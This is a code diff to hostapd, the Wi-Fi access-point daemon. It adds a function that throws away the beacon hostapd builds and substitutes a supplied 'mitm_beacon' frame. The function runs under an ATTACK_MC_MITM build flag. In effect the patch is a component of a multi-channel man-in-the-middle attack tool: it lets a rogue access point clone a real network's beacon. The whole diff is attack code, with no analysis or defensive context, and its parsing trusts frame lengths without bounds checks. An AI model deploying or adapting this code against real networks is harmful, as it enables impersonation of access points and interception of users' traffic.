@@ -1496,6 +1496,47 @@ static u8 * hostapd_fils_discovery(struct hostapd_data *hapd,
 #endif /* CONFIG_FILS */
 
 
+int ieee802_11_build_ap_params_override_beacon(struct hostapd_data *hapd,
+			       struct wpa_driver_ap_params *params)
+{
+	const struct ieee80211_mgmt *header = (struct ieee80211_mgmt*)wpabuf_head(hapd->conf->mitm_beacon);
+	size_t len = wpabuf_len(hapd->conf->mitm_beacon);
+
+	// Free constructed beacon
+	wpa_hexdump(MSG_DEBUG, "existing head", params->head, params->head_len);
+	wpa_hexdump(MSG_DEBUG, "existing tail", params->tail, params->tail_len);
+	if (params->head)
+		os_free(params->head);
+	if (params->tail)
+		os_free(params->tail);
+
+	const u8 *ies = (const u8 *)header->u.beacon.variable;
+	size_t ies_len = len - (header->u.beacon.variable - (const u8*)header);
+
+	wpa_hexdump(MSG_DEBUG, "mitm_beacon ies", ies, ies_len);
+
+	const u8 *tim = get_ie(header->u.beacon.variable, ies_len, WLAN_EID_TIM);
+	if (tim == NULL) {
+		wpa_printf(MSG_WARNING,
+			   "Unable to find TIM element in mitm_beacon");
+		return -1;
+	}
+
+	// Copy the head before the TIM element
+	params->head_len = tim - (const u8*)header;
+	params->head = os_zalloc(params->head_len);
+	memcpy(params->head, header, params->head_len);
+
+	// Copy the tail after the TIM element
+	const u8 *tail = tim + 2 + tim[1];
+	params->tail_len = len - (tail - (const u8*)header);
+	params->tail = os_zalloc(params->tail_len);
+	memcpy(params->tail, tail, params->tail_len);
+
+	return 0;
+}
+
+
 int ieee802_11_build_ap_params(struct hostapd_data *hapd,
 			       struct wpa_driver_ap_params *params)
 {
@@ -1905,6 +1946,13 @@ static int __ieee802_11_set_beacon(struct hostapd_data *hapd)
 
 	if (ieee802_11_build_ap_params(hapd, &params) < 0)
 		return -1;
+
+#ifdef ATTACK_MC_MITM
+	if (hapd->conf->mitm_beacon &&
+		ieee802_11_build_ap_params_override_beacon(hapd, &params) < 0) {
+		return -1;
+	}
+#endif /* ATTACK_MC_MITM */
 
 	if (hostapd_build_ap_extra_ies(hapd, &beacon, &proberesp, &assocresp) <
 	    0)
